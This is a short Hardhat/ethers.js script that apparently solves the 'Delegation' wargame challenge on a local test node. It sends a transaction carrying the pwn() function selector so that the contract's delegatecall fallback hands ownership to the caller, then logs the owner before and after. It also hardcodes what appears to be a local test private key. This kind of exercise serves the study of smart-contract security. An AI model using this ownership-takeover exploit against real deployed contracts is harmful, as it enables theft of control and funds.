
const { ethers } = require("hardhat");
async function main () {
  /*const contract = await ethers.getContractAt(
    "Delegation", 
    contractaddress, 
    signer
  ) */

  /*const instance = "0xCBd5431cC04031d089c90E7c83288183A6Fe545d";
  const provider = new ethers.JsonRpcProvider('http://localhost:8545');
  const signer = new ethers.Wallet('5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a', provider);
  const abi = [
    "function owner() view returns (address)"
  ];
  const contract = new ethers.Contract(instance, abi, signer);*/
  const useraddress = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8";
  const instanceaddress = "0x454b0a07000FAD1a4686c40428463cC353E3fE84";
  const signer = await ethers.getSigner(useraddress);
  const contract = await ethers.getContractAt(
    "Delegation",
    instanceaddress,
    signer
  );
  let owner = await contract.owner();
  console.log("Before", owner);

  let hex = ethers.keccak256(ethers.toUtf8Bytes("pwn()"));
  let data = hex.substring(0, 10);
  console.log(data);

  signer.sendTransaction({from: useraddress, to:  instanceaddress, data: data})
  /*const attackcontract = await ethers.getContractFactory("Attack");
  const deploycontract = await attackcontract.deploy(instanceaddress);
  const tx = await deploycontract.connect(signer).attack();


  console.log("Send transcation: ", tx.hash);
  tx.wait();
*/
  owner = await contract.owner();
  console.log("after", owner);
  //let exploit = await deploycontract.attack();
  
  //console.log("Send transaction: ", exploit.hash);

  //owner = await contract.owner();

  //console.log("After owner:  ", owner);

}


main().catch((error) => {
  console.error(error);
  process.exit(1);
})

